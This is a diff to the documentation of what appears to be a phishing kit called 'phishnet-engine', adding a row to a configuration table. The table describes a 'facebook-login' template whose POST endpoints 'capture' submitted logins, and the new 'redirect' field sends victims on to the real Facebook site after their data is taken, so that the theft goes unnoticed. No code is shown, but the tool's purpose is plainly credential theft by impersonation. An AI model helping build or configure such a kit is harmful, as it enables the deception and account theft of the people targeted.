@@ -129,6 +129,7 @@ phishnet-engine/
 | `name` | Must match folder name | `"facebook-login"` |
 | `site` | Site identifier for logs | `"facebook"` |
 | `endpoints` | POST routes to capture | `["/login", "/auth"]` |
+| `redirect` | URL where the user is redirected after data capture | "https://www.facebook.com" |
 | `port` | Server port | `3000` |
 | `created` | Unix timestamp | `1678901234567` |
 
